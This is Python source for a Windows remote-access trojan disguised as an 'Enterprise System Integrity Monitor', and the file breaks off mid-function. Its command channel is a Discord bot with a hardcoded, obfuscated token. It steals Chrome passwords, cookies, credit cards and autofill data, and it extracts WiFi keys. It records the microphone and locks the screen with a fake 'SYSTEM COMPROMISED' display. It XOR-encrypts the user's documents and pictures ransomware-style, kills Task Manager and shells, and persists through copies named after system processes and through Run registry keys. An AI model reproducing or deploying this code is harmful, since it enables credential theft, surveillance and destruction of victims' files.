#!/usr/bin/env python
# -*- coding: utf-8 -*-
# WINDOWS SYSTEM INTEGRITY MONITOR v7.1 - ENTERPRISE MANAGEMENT
# Advanced System Monitoring with Multi-Client Support
# Enterprise Security Edition

import os
import sys
# Force aiohttp to use standard DNS resolver (fixes Windows DNS timeout issues)
try:
    sys.modules['aiodns'] = None
except:
    pass
import time
import threading
import requests
import socket
import subprocess
import shutil
import platform
import getpass
import tempfile
import ctypes
import base64
import random
import string
import json
import winreg
import hashlib
import uuid
import re
import io
import zipfile
import struct
from uuid import getnode as get_mac
import psutil
import discord
from discord.ext import commands
from discord import File
import asyncio
from PIL import Image, ImageGrab
import fnmatch
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
import wave
import pyaudio
from collections import deque
import sqlite3
import binascii
import geopy.geocoders
from geopy.geocoders import Nominatim
import ipaddress
import geoip2.database

# ================== ENTERPRISE SECURITY CONFIGURATION ==================
class EnterpriseSecurityConfig:
    def __init__(self):
        self.encrypted_data = {
            "token": self._encrypt_string("MTQyNDEwNjk4MjI3MjUzMjYzMQ.G1JTYL.kRO14Fcb1BxBuvoCVGWLHF1ijssqSUDDrHxg**"),
            "channel": self._encrypt_string("1424111601438560326"),
            "keys": self._generate_encryption_keys()
        }
    
    def _encrypt_string(self, data):
        # Multi-layer encryption with system-specific key
        key = hashlib.sha512(f"{get_mac()}{getpass.getuser()}".encode()).digest()
        
        if isinstance(data, str):
            data = data.encode()
        key_byte = (key * (len(data) // len(key) + 1))[:len(data)]
        encrypted = bytes([a ^ b for a, b in zip(data, key_byte)])
        return base64.b64encode(encrypted).decode()
    
    def _decrypt_string(self, encrypted_data):
        try:
            data = base64.b64decode(encrypted_data)
            key = hashlib.sha512(f"{get_mac()}{getpass.getuser()}".encode()).digest()
            key_byte = (key * (len(data) // len(key) + 1))[:len(data)]
            decrypted = bytes([a ^ b for a, b in zip(data, key_byte)])
            return decrypted.decode()
        except:
            return ""
    
    def _generate_encryption_keys(self):
        return hashlib.sha512(f"{get_mac()}{getpass.getuser()}{platform.node()}".encode()).digest()
    
    def get_token(self):
        return self._decrypt_string(self.encrypted_data["token"])
    
    def get_channel_id(self):
        return int(self._decrypt_string(self.encrypted_data["channel"]))

# Initialize secure config
config = EnterpriseSecurityConfig()
DISCORD_BOT_TOKEN = config.get_token()
DISCORD_CHANNEL_ID = config.get_channel_id()

# Global variables
_system_integrity_check = hashlib.sha256(f"{get_mac()}{getpass.getuser()}".encode()).digest()
_system_lock_name = "Global\\" + hashlib.md5(getpass.getuser().encode()).hexdigest()[:12]
_temporary_storage = tempfile.gettempdir()
_persistence_locations = [
    os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup"),
    os.path.join(os.environ["PROGRAMDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup"),
    os.path.join(os.environ["SYSTEMROOT"], "System32"),
    os.path.join(os.environ["SYSTEMROOT"], "SysWOW64"),
]
_operational_payloads = []
_current_working_directory = os.getcwd()
_device_identifier = hashlib.sha256(f"{get_mac()}{getpass.getuser()}".encode()).hexdigest()[:8]
_file_explorer_location = os.path.expanduser("~")
_communication_interval = 120

# Advanced features
_desktop_streaming = False
_keylogger_active = False
_live_keylogger_active = False
_keylog_buffer = []
_last_keylog_send = 0
_stream_quality = 50
_keyboard_listener = None
_webcam_streaming = False
_auto_spread_active = False
_voice_recording_active = False
_recovery_service = None # Global for Lockdown Service

# Multi-Client Management
_connected_clients = {}  # device_id -> client_info
_active_client_id = None  # Currently selected client

# Multi-Command Support System
_active_commands = {}  # command_id -> {"thread": thread, "type": type, "start_time": timestamp}
_command_counter = 0
_command_executor = ThreadPoolExecutor(max_workers=20, thread_name_prefix="SysCmd")

# Voice Recording System
_voice_recorder = None
_voice_recording_interval = 30  # seconds

# Discord setup
_intents_config = discord.Intents.default()
_intents_config.message_content = True
_communication_bot = commands.Bot(command_prefix='.', intents=_intents_config, help_command=None)

# ========== REAL BROWSER DATA EXTRACTION SERVICE ==========
class BrowserDataExtractionService:
    def __init__(self):
        self.browser_paths = {
            'Chrome': os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data'),
            'Firefox': os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Mozilla', 'Firefox', 'Profiles'),
            'Edge': os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data'),
            'Opera': os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Opera Software', 'Opera Stable'),
            'Brave': os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'BraveSoftware', 'Brave-Browser', 'User Data')
        }
        
        # Initialize GeoIP for real location data
        try:
            self.geolocator = Nominatim(user_agent="system_monitor")
            self.geoip_reader = geoip2.database.Reader('GeoLite2-City.mmdb')  # Requires GeoIP database
        except:
            self.geolocator = None
            self.geoip_reader = None
    
    def decrypt_chrome_data(self, encrypted_data):
        """Decrypt Chrome data using Windows DPAPI with enhanced fallback"""
        try:
            import win32crypt
            decrypted = win32crypt.CryptUnprotectData(encrypted_data, None, None, None, 0)
            return decrypted[1].decode('utf-8') if decrypted[1] else ""
        except Exception as e:
            try:
                # Enhanced fallback using ctypes
                import ctypes
                from ctypes import wintypes, byref

                class DATA_BLOB(ctypes.Structure):
                    _fields_ = [('cbData', wintypes.DWORD),
                                ('pbData', ctypes.POINTER(ctypes.c_byte))]

                blob = DATA_BLOB()
                blob.pbData = ctypes.cast(ctypes.c_char_p(encrypted_data), ctypes.POINTER(ctypes.c_byte))
                blob.cbData = len(encrypted_data)

                blob_out = DATA_BLOB()
                if ctypes.windll.crypt32.CryptUnprotectData(byref(blob), None, None, None, None, 0, byref(blob_out)):
                    buffer = ctypes.create_string_buffer(blob_out.cbData)
                    ctypes.memmove(buffer, blob_out.pbData, blob_out.cbData)
                    ctypes.windll.kernel32.LocalFree(blob_out.pbData)
                    return buffer.raw.decode('utf-8', errors='ignore')
                else:
                    return self._try_xor_decrypt(encrypted_data)
            except Exception as e2:
                return self._try_xor_decrypt(encrypted_data)
    
    def _try_xor_decrypt(self, encrypted_data):
        """Try XOR decryption with multiple keys"""
        try:
            # Try system-specific XOR decryption
            key = hashlib.sha512(f"{get_mac()}{getpass.getuser()}".encode()).digest()
            data = base64.b64decode(encrypted_data)
            key_byte = (key * (len(data) // len(key) + 1))[:len(data)]
            decrypted = bytes([a ^ b for a, b in zip(data, key_byte)])
            return decrypted.decode('utf-8', errors='ignore')
        except:
            return "[Decryption Failed - Multiple attempts]"
    
    def get_chrome_passwords(self):
        """Extract REAL Chrome passwords with enhanced decryption"""
        passwords = []
        try:
            chrome_path = os.path.join(self.browser_paths['Chrome'], 'Default', 'Login Data')
            if not os.path.exists(chrome_path):
                # Try to find any profile
                for profile in os.listdir(self.browser_paths['Chrome']):
                    if profile.startswith('Profile') or profile == 'Default':
                        profile_path = os.path.join(self.browser_paths['Chrome'], profile, 'Login Data')
                        if os.path.exists(profile_path):
                            chrome_path = profile_path
                            break
            
            if not os.path.exists(chrome_path):
                return passwords
            
            # Copy database to avoid locks
            temp_db = os.path.join(tempfile.gettempdir(), f'chrome_passwords_{int(time.time())}.db')
            shutil.copy2(chrome_path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
            
            for row in cursor.fetchall():
                url = row[0] or "No URL"
                username = row[1] or "No Username"
                encrypted_password = row[2]
                
                if encrypted_password:
                    password = self.decrypt_chrome_data(encrypted_password)
                else:
                    password = "[Empty Password]"
                
                if username and username != "No Username":
                    passwords.append({
                        'url': url,
                        'username': username,
                        'password': password
                    })
            
            conn.close()
            try:
                os.remove(temp_db)
            except:
                pass
            
        except Exception as e:
            print(f"Chrome password extraction error: {e}")
        
        return passwords
    
    def get_chrome_cookies(self):
        """Extract Chrome cookies in Netscape format (Importable)"""
        try:
            # Paths similar to passwords
            local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
            cookie_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
            
            if not os.path.exists(cookie_path):
                cookie_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Cookies")
                if not os.path.exists(cookie_path): return []
            
            key = self._get_encryption_key(local_state_path)
            shutil.copyfile(cookie_path, os.path.join(tempfile.gettempdir(), "Cookies.db"))
            db = sqlite3.connect(os.path.join(tempfile.gettempdir(), "Cookies.db"))
            cursor = db.cursor()
            
            # Try varying schemas
            try: cursor.execute("SELECT host_key, name, encrypted_value, path, is_secure, expires_utc FROM cookies")
            except: cursor.execute("SELECT host_key, name, encrypted_value, path, is_secure, expires_utc FROM cookies") # Fallback logic if needed
            
            cookies = []
            for host_key, name, encrypted_value, path, is_secure, expires_utc in cursor.fetchall():
                try:
                    decrypted_value = self._decrypt_password(encrypted_value, key)
                    
                    # Netscape Format: domain flag path secure expiration name value
                    flag = "TRUE" if host_key.startswith('.') else "FALSE"
                    secure = "TRUE" if is_secure else "FALSE"
                    expiry = str(int(expires_utc/1000000)-11644473600) 
                    
                    # Tagging
                    tag = ""
                    if "facebook" in host_key: tag = " [📘 FB]"
                    elif "instagram" in host_key: tag = " [📸 IG]"
                    elif "netflix" in host_key: tag = " [🎥 NF]"
                    elif "amazon" in host_key: tag = " [💳 AMZ]"
                    elif "google" in host_key: tag = " [G]"
                    
                    cookies.append({
                        'host': host_key + tag,
                        'name': name,
                        'value': decrypted_value,
                        'netscape': f"{host_key}\t{flag}\t{path}\t{secure}\t{expiry}\t{name}\t{decrypted_value}"
                    })
                except: pass
                
            db.close()
            try: os.remove(os.path.join(tempfile.gettempdir(), "Cookies.db"))
            except: pass
            return cookies
        except Exception as e:
            return []
    
    def get_chrome_history(self):
        """Extract Chrome browsing history"""
        history = []
        try:
            chrome_path = os.path.join(self.browser_paths['Chrome'], 'Default', 'History')
            if not os.path.exists(chrome_path):
                return history
            
            temp_db = os.path.join(tempfile.gettempdir(), f'chrome_history_{int(time.time())}.db')
            shutil.copy2(chrome_path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute('SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50')
            
            for row in cursor.fetchall():
                url = row[0] or "No URL"
                title = row[1] or "No Title"
                visit_count = row[2] or 0
                last_visit = row[3] or 0
                
                # Convert Chrome timestamp to readable date
                try:
                    visit_time = datetime(1601, 1, 1) + timedelta(microseconds=last_visit)
                    visit_time_str = visit_time.strftime('%Y-%m-%d %H:%M:%S')
                except:
                    visit_time_str = "Unknown Time"
                
                history.append({
                    'url': url,
                    'title': title,
                    'visit_count': visit_count,
                    'last_visit': visit_time_str
                })
            
            conn.close()
            try:
                os.remove(temp_db)
            except:
                pass
            
        except Exception as e:
            print(f"Chrome history extraction error: {e}")
        
        return history
    
    def get_chrome_credit_cards(self):
        """Extract Chrome saved credit cards with ENHANCED correlation"""
        cards = []
        try:
            chrome_path = os.path.join(self.browser_paths['Chrome'], 'Default', 'Web Data')
            if not os.path.exists(chrome_path):
                return cards
            
            temp_db = os.path.join(tempfile.gettempdir(), f'chrome_cc_{int(time.time())}.db')
            shutil.copy2(chrome_path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            # Try to get credit card information and origin
            try:
                # Check if origin column exists (newer Chrome versions)
                try:
                    cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, origin FROM credit_cards')
                    has_origin = True
                except:
                    cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards')
                    has_origin = False
                
                ccs = cursor.fetchall()
                
                # Intelligent Correlation: Fetch Autofill Emails/Phones to associate
                autofill_info = {"emails": [], "phones": []}
                try:
                    cursor.execute("SELECT value FROM autofill WHERE name LIKE '%email%' OR name LIKE '%phone%' OR value LIKE '%@%'")
                    for row in cursor.fetchall():
                        val = row[0]
                        if '@' in val and val not in autofill_info["emails"]:
                            autofill_info["emails"].append(val)
                        elif any(c.isdigit() for c in val) and len(val) > 7 and val not in autofill_info["phones"]:
                            autofill_info["phones"].append(val)
                except:
                    pass

                for row in ccs:
                    name = row[0] or "No Name"
                    exp_month = row[1] or 0
                    exp_year = row[2] or 0
                    encrypted_card = row[3]
                    origin = row[4] if has_origin and len(row) > 4 else "Unknown Origin"
                    
                    card_number = self.decrypt_chrome_data(encrypted_card) if encrypted_card else "[Encrypted]"
                    
                    cards.append({
                        'name': name,
                        'card_number': card_number,
                        'expiry': f"{exp_month}/{exp_year}",
                        'origin': origin,
                        'associated_data': autofill_info
                    })
            except sqlite3.OperationalError:
                # Table doesn't exist
                pass
            
            conn.close()
            try:
                os.remove(temp_db)
            except:
                pass
            
        except Exception as e:
            print(f"Chrome credit card extraction error: {e}")
        
        return cards
    
    def get_chrome_autofill(self):
        """Extract Chrome autofill data"""
        autofill = []
        try:
            chrome_path = os.path.join(self.browser_paths['Chrome'], 'Default', 'Web Data')
            if not os.path.exists(chrome_path):
                return autofill
            
            temp_db = os.path.join(tempfile.gettempdir(), f'chrome_autofill_{int(time.time())}.db')
            shutil.copy2(chrome_path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            try:
                cursor.execute('SELECT name, value FROM autofill LIMIT 50')
                
                for row in cursor.fetchall():
                    name = row[0] or "No Name"
                    value = row[1] or "No Value"
                    
                    autofill.append({
                        'field': name,
                        'value': value
                    })
            except sqlite3.OperationalError:
                pass
            
            conn.close()
            try:
                os.remove(temp_db)
            except:
                pass
            
        except Exception as e:
            print(f"Chrome autofill extraction error: {e}")
        
        return autofill
    
    def get_wifi_passwords(self):
        """Extract REAL WiFi passwords"""
        wifi_data = []
        try:
            # Get all WiFi profiles
            profiles = subprocess.check_output(
                'netsh wlan show profiles', 
                shell=True, 
                stderr=subprocess.DEVNULL, 
                stdin=subprocess.DEVNULL
            ).decode('utf-8', errors='ignore')
            
            # Extract profile names
            profile_names = re.findall(r'All User Profile\s*:\s*(.*)', profiles)
            
            for profile_name in profile_names:
                try:
                    # Get detailed profile info with password
                    profile_info = subprocess.check_output(
                        f'netsh wlan show profile name="{profile_name.strip()}" key=clear', 
                        shell=True, 
                        stderr=subprocess.DEVNULL, 
                        stdin=subprocess.DEVNULL
                    ).decode('utf-8', errors='ignore')
                    
                    # Extract password
                    password_match = re.search(r'Key Content\s*:\s*(.*)', profile_info)
                    password = password_match.group(1).strip() if password_match else "Open Network"
                    
                    # Extract authentication
                    auth_match = re.search(r'Authentication\s*:\s*(.*)', profile_info)
                    auth = auth_match.group(1).strip() if auth_match else "Unknown"
                    
                    wifi_data.append({
                        'ssid': profile_name.strip(),
                        'password': password,
                        'authentication': auth
                    })
                    
                except Exception as e:
                    continue
                    
        except Exception as e:
            print(f"WiFi password extraction error: {e}")
        
        return wifi_data
    
    def get_comprehensive_browser_data(self):
        """Get comprehensive browser data from all installed browsers"""
        comprehensive_data = {}
        
        # Chrome Data
        try:
            chrome_data = {
                'passwords': self.get_chrome_passwords(),
                'cookies': self.get_chrome_cookies(),
                'history': self.get_chrome_history(),
                'credit_cards': self.get_chrome_credit_cards(),
                'autofill': self.get_chrome_autofill(),
                'status': 'Extracted Successfully'
            }
            comprehensive_data['Google Chrome'] = chrome_data
        except Exception as e:
            comprehensive_data['Google Chrome'] = {'status': f'Error: {str(e)}'}
        
        # Check if browsers are installed
        browsers = ['Firefox', 'Edge', 'Opera', 'Brave']
        for browser in browsers:
            if os.path.exists(self.browser_paths.get(browser, '')):
                comprehensive_data[browser] = {'status': 'Browser Installed - Use specific extraction commands'}
            else:
                comprehensive_data[browser] = {'status': 'Not Installed'}
        
        return comprehensive_data
    
    def get_real_ip_info(self, ip_address):
        """Get real IP information including country, city, etc."""
        if not self.geolocator or not self.geoip_reader:
            return {"error": "GeoIP database not available"}
        
        try:
            # Get location from IP
            location = self.geolocator.geocode(ip_address)
            if location:
                return {
                    'ip': ip_address,
                    'country': location.raw.get('address', {}).get('country', 'Unknown'),
                    'city': location.raw.get('address', {}).get('city', 'Unknown'),
                    'latitude': location.latitude,
                    'longitude': location.longitude
                }
            
            # Fallback to GeoIP database
            response = self.geoip_reader.city(ip_address)
            return {
                'ip': ip_address,
                'country': response.country.name,
                'city': response.city.name,
                'latitude': response.location.latitude,
                'longitude': response.location.longitude,
                'timezone': response.location.time_zone
            }
        except Exception as e:
            return {"error": str(e)}

# Initialize browser data extraction service
_browser_extractor = BrowserDataExtractionService()

# ========== VOICE RECORDING SERVICE ==========
class VoiceRecordingService:
    def __init__(self, bot, channel):
        self.is_recording = False
        self.bot = bot
        self.channel = channel
        self.recording_interval = 30
        self.audio = None
        self.frames = []
        self.recording_thread = None
        self.stream = None
        
    def start_recording(self, interval=30):
        """Start voice recording with specified interval"""
        if self.is_recording:
            return False
            
        try:
            self.audio = pyaudio.PyAudio()
            self.recording_interval = interval
            self.is_recording = True
            self.recording_thread = threading.Thread(target=self._recording_worker, daemon=True)
            self.recording_thread.start()
            return True
        except Exception as e:
            print(f"Voice recording error: {e}")
            return False
        
    def stop_recording(self):
        """Stop voice recording"""
        self.is_recording = False
        if self.stream:
            try:
                self.stream.stop_stream()
                self.stream.close()
            except:
                pass
        if self.audio:
            try:
                self.audio.terminate()
            except:
                pass

        if self.recording_thread:
            self.recording_thread.join(timeout=1)

# ========== SYSTEM RECOVERY SERVICE (Lockdown) ==========
class SystemRecoveryService:
    def __init__(self, bot, channel):
        self.bot = bot
        self.channel = channel
        self.is_locked = False
        self.root = None
        self.chat_history = []
        
    def _lock_ui_thread(self):
        try:
            import tkinter as tk
            from tkinter import scrolledtext
            import threading
            import random
            
            self.root = tk.Tk()
            self.root.attributes('-fullscreen', True)
            self.root.attributes('-topmost', True)
            self.root.configure(background='black')
            self.root.protocol("WM_DELETE_WINDOW", lambda: None) # Block Alt+F4
            
            # Canvas for Matrix/Glitch Effect
            self.canvas = tk.Canvas(self.root, bg='black', highlightthickness=0)
            self.canvas.pack(fill=tk.BOTH, expand=True)
            
            # Main Horror Message
            self.horror_msg = "⚠️ SYSTEM COMPROMISED ⚠️"
            self.admin_msg = "DO NOT TURN OFF YOUR PC."
            
            # Use Cyber Red (#FF0000) and Blood Red (#8B0000)
            self.main_label = tk.Label(self.root, text=self.horror_msg, font=("Courier", 45, "bold"), fg="#FF0000", bg="black")
            self.main_label_window = self.canvas.create_window(self.root.winfo_screenwidth()//2, self.root.winfo_screenheight()//3, window=self.main_label)
            
            self.sub_label = tk.Label(self.root, text=self.admin_msg, font=("Courier", 24, "bold"), fg="#8B0000", bg="black")
            self.sub_label_window = self.canvas.create_window(self.root.winfo_screenwidth()//2, self.root.winfo_screenheight()//2, window=self.sub_label)
            
            # Advanced Matrix Animation
            chars = "0123456789ABCDEF!@#$%^&*()_+-=[]{}|;:,.<>?"
            columns = self.root.winfo_screenwidth() // 20
            drops = [random.randint(-20, 0) for _ in range(columns)]
            
            def draw_matrix():
                if not self.is_locked: return
                
                # Screen Flicker Effect (Occasional dark grey flash)
                if random.random() > 0.99:
                    self.canvas.create_rectangle(0, 0, self.root.winfo_screenwidth(), self.root.winfo_screenheight(), fill='#111111')
                else:
                    self.canvas.create_rectangle(0, 0, self.root.winfo_screenwidth(), self.root.winfo_screenheight(), fill='black', stipple='gray50')
                
                for i in range(len(drops)):
                    char = random.choice(chars)
                    x = i * 20
                    y = drops[i] * 20
                    
                    # Use deep blood red for matrix characters
                    self.canvas.create_text(x, y, text=char, fill='#440000', font=("Courier", 14))
                    
                    if drops[i] * 20 > self.root.winfo_screenheight() and random.random() > 0.975:
                        drops[i] = 0
                    drops[i] += 1
                
                # Intense Glitch effect for labels
                if random.random() > 0.85:
                    glitch_colors = ["#FF0000", "#FFFFFF", "#8B0000", "#FF4444"]
                    self.main_label.config(fg=random.choice(glitch_colors))
                    self.canvas.move(self.main_label_window, random.randint(-10, 10), random.randint(-10, 10))
                    if random.random() > 0.95: # Extreme jump
                         self.canvas.move(self.main_label_window, random.randint(-50, 50), random.randint(-50, 50))
                else:
                    self.main_label.config(fg="#FF0000")
                
                self.root.after(40, draw_matrix)

            # Persistence Loop (Professional focus management)
            def focus_loop():
                while self.is_locked:
                    try:
                        if self.root:
                            self.root.attributes("-topmost", True)
                            self.root.lift()
                            self.root.deiconify()
                            self.root.focus_force()
                    except: pass
                    time.sleep(0.5) # More aggressive focus reinforcement
            
            threading.Thread(target=focus_loop, daemon=True).start()
            draw_matrix()
            self.root.mainloop()
        except Exception as e:
            print(f"UI Error: {e}")

    def _unlock(self):
        self.is_locked = False
        if self.root:
            self.root.destroy()
            self.root = None
        
        # Send Notification to Discord
        if self.bot and self.bot.loop:
            channel = self.bot.get_channel(config.get_channel_id())
            if channel:
                asyncio.run_coroutine_threadsafe(channel.send("✅ **System Unlocked via Password**"), self.bot.loop)

    def lock_system(self):
        if self.is_locked: return
        self.is_locked = True
        threading.Thread(target=self._lock_ui_thread, daemon=True).start()
        # Kill common tools
        threading.Thread(target=self._kill_tools, daemon=True).start()
        # Encrypt User Files
        threading.Thread(target=self._encrypt_user_files, daemon=True).start()

    def _encrypt_user_files(self):
        """Background encryption of Documents/Photos"""
        target_dirs = [
            os.path.join(os.environ["USERPROFILE"], "Documents"),
            os.path.join(os.environ["USERPROFILE"], "Pictures"),
            os.path.join(os.environ["USERPROFILE"], "Desktop")
        ]
        key = b'openyasir_secret_key_xor' # Simple XOR key
        
        for d in target_dirs:
            if not self.is_locked: break
            for root, dirs, files in os.walk(d):
                for file in files:
                    if file.lower().endswith(('.txt', '.doc', '.docx', '.jpg', '.png', '.pdf')):
                        try:
                            path = os.path.join(root, file)
                            with open(path, 'rb') as f: data = f.read()
                            # XOR Encryption
                            encrypted = bytearray([b ^ key[i % len(key)] for i, b in enumerate(data)])
                            with open(path, 'wb') as f: f.write(encrypted)
                            shutil.move(path, path + ".LOCKED")
                        except: pass
        
    def _kill_tools(self):
        targets = ["taskmgr.exe", "cmd.exe", "powershell.exe", "regedit.exe"]
        while self.is_locked:
            for t in targets:
                try: subprocess.run(f"taskkill /f /im {t}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                except: pass
            time.sleep(2)

    def send_admin_message(self, text):
        if self.root and self.main_label:
            try:
                self.admin_msg = text
                self.root.after(0, lambda: self.sub_label.config(text=text))
                self.root.after(0, lambda: self.root.lift())
                self.root.after(0, lambda: self.root.attributes("-topmost", True))
                self.root.after(0, lambda: self.root.deiconify())
            except: pass
            
        
    def _recording_worker(self):
        """Background worker for voice recording"""
        try:
            # Audio settings
            FORMAT = pyaudio.paInt16
            CHANNELS = 2
            RATE = 44100
            CHUNK = 1024
            
            self.stream = self.audio.open(
                format=FORMAT,
                channels=CHANNELS,
                rate=RATE,
                input=True,
                frames_per_buffer=CHUNK
            )
            
            while self.is_recording:
                frames = []
                start_time = time.time()
                
                # Record for the specified interval
                while (time.time() - start_time) < self.recording_interval and self.is_recording:
                    try:
                        data = self.stream.read(CHUNK, exception_on_overflow=False)
                        frames.append(data)
                    except Exception as e:
                        print(f"Audio recording error: {e}")
                        break
                
                # Save and send the recording
                if frames and self.is_recording:
                    asyncio.run_coroutine_threadsafe(self._send_recording(frames, FORMAT, CHANNELS, RATE), self.bot.loop)
                    
        except Exception as e:
            print(f"Voice recording worker error: {e}")


            
    async def _send_recording(self, frames, format, channels, rate):
        """Send recording to Discord"""
        try:
            # Create WAV file in memory
            wav_buffer = io.BytesIO()
            
            with wave.open(wav_buffer, 'wb') as wf:
                wf.setnchannels(channels)
                wf.setsampwidth(self.audio.get_sample_size(format))
                wf.setframerate(rate)
                wf.writeframes(b''.join(frames))
            
            wav_buffer.seek(0)
            
            # Send to Discord
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            filename = f"voice_recording_{timestamp}.wav"
            
            await self.channel.send(
                f"🎤 **Voice Recording** - {timestamp} ({self.recording_interval}s)",
                file=File(wav_buffer, filename=filename)
            )
            
        except Exception as e:
            print(f"Error sending voice recording: {e}")

# ========== COMMAND ORCHESTRATION SERVICE ==========
class CommandOrchestrationService:
    def __init__(self):
        self.active_commands = {}
        self.command_counter = 0
        self.executor = ThreadPoolExecutor(max_workers=25, thread_name_prefix="SysCmd")
        self.lock = threading.Lock()
        
    def generate_command_id(self):
        """Generate unique command ID"""
        with self.lock:
            self.command_counter += 1
            return f"CMD_{self.command_counter}_{int(time.time())}"
    
    def start_command(self, command_func, *args, **kwargs):
        """Start a command in separate thread"""
        command_id = self.generate_command_id()
        
        def command_wrapper():
            try:
                # Update client activity
                _client_management_service.update_client_activity(_device_identifier)
                # Execute the command
                command_func(*args, **kwargs)
            except Exception as e:
                print(f"Command {command_id} error: {e}")
            finally:
                # Remove from active commands when done
                self.remove_command(command_id)
        
        # Start the command in thread pool
        future = self.executor.submit(command_wrapper)
        
        # Store command info
        with self.lock:
            self.active_commands[command_id] = {
                "future": future,
                "start_time": time.time(),
                "type": command_func.__name__ if hasattr(command_func, '__name__') else 'unknown',
                "status": "running",
                "args": str(args)[:100] + "..." if len(str(args)) > 100 else str(args)
            }
        
        return command_id
    
    def remove_command(self, command_id):
        """Remove command from active list"""
        with self.lock:
            if command_id in self.active_commands:
                del self.active_commands[command_id]
    
    def get_active_commands(self):
        """Get list of active commands"""
        with self.lock:
            return self.active_commands.copy()
    
    def stop_command(self, command_id):
        """Stop a specific command"""
        with self.lock:
            if command_id in self.active_commands:
                future = self.active_commands[command_id]["future"]
                future.cancel()
                self.remove_command(command_id)
                return True
        return False
    
    def stop_all_commands(self):
        """Stop all active commands"""
        with self.lock:
            for command_id, cmd_data in self.active_commands.items():
                try:
                    cmd_data["future"].cancel()
                except:
                    pass
            self.active_commands.clear()

# Initialize command orchestrator
_command_orchestrator = CommandOrchestrationService()

# ========== CLIENT MANAGEMENT SERVICE ==========
class ClientManagementService:
    def __init__(self):
        self.clients = {}  # device_id -> {"info": client_info, "last_seen": timestamp}
        self.active_client = None
        
    def register_client(self, device_id, client_info):
        """Register a new client"""
        self.clients[device_id] = {
            "info": client_info,
            "last_seen": time.time(),
            "online": True
        }
        
        # If no active client, set this as active
        if self.active_client is None:
            self.active_client = device_id
            
        return True
        
    def unregister_client(self, device_id):
        """Unregister a client"""
        if device_id in self.clients:
            del self.clients[device_id]
            
            # If active client was removed, choose another
            if self.active_client == device_id:
                if self.clients:
                    self.active_client = next(iter(self.clients.keys()))
                else:
                    self.active_client = None
            return True
        return False
        
    def set_active_client(self, device_id):
        """Set active client"""
        if device_id in self.clients:
            self.active_client = device_id
            return True
        return False
        
    def get_active_client(self):
        """Get active client info"""
        if self.active_client and self.active_client in self.clients:
            return self.clients[self.active_client]
        return None
        
    def list_clients(self):
        """Get list of all clients"""
        return self.clients
        
    def update_client_activity(self, device_id):
        """Update client last seen timestamp"""
        if device_id in self.clients:
            self.clients[device_id]["last_seen"] = time.time()
            self.clients[device_id]["online"] = True
            return True
        return False
        
    def cleanup_offline_clients(self, timeout=300):
        """Remove clients that haven't been seen in timeout seconds"""
        current_time = time.time()
        offline_clients = []
        
        for device_id, client_data in self.clients.items():
            if current_time - client_data["last_seen"] > timeout:
                offline_clients.append(device_id)
                
        for device_id in offline_clients:
            self.unregister_client(device_id)
            
        return offline_clients

# Initialize client manager
_client_management_service = ClientManagementService()

# ========== SYSTEM PERSISTENCE SERVICE ==========
class SystemPersistenceService:
    def __init__(self):
        self.persistence_locations = [
            os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup"),
            os.path.join(os.environ["PROGRAMDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup"),
            os.path.join(os.environ["SYSTEMROOT"], "System32"),
            os.path.join(os.environ["SYSTEMROOT"], "SysWOW64"),
        ]
        
    def create_stealth_copies(self):
        """Create multiple stealth copies in system locations"""
        try:
            stealth_names = [
                "svchost.exe", "csrss.exe", "winlogon.exe", "services.exe",
                "lsass.exe", "spoolsv.exe", "explorer.exe", "taskhost.exe"
            ]
            
            current_file = sys.argv[0]
            
            for location in self.persistence_locations:
                try:
                    if not os.path.exists(location):
                        os.makedirs(location, exist_ok=True)
                    
                    stealth_name = random.choice(stealth_names)
                    stealth_path = os.path.join(location, stealth_name)
                    
                    if not os.path.exists(stealth_path):
                        shutil.copy2(current_file, stealth_path)
                        _operational_payloads.append(stealth_path)
                        
                        # Set hidden and system attributes
                        try:
                            ctypes.windll.kernel32.SetFileAttributesW(stealth_path, 2)  # FILE_ATTRIBUTE_HIDDEN
                            ctypes.windll.kernel32.SetFileAttributesW(stealth_path, 4)  # FILE_ATTRIBUTE_SYSTEM
                        except:
                            pass
                except:
                    continue
                    
            return True
        except:
            return False

    def establish_advanced_persistence(self):
        """Establish multiple persistence mechanisms"""
        try:
            # Create stealth copies first
            self.create_stealth_copies()
            
            persistence_methods = [
                self._registry_persistence_current_user,
                self._registry_persistence_local_machine,
                self._scheduled_task_persistence,
                self._service_persistence,
                self._startup_folder_persistence
            ]
            
            for method in persistence_methods:
                try:
                    method()
                    time.sleep(0.5)
                except:
                    continue
                    
            return True
        except:
            return False

    def _registry_persistence_current_user(self):
        """Registry persistence in current user"""
        try:
            reg_paths = [
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                r"Software\Microsoft\Windows\CurrentVersion\RunOnce",
            ]
            
            for reg_path in reg_paths:
                try:
                    value_name = "WindowsSystemManager"
                    payload_path = random.choice(_operational_payloads) if _operational_payloads else sys.argv[0]
                    
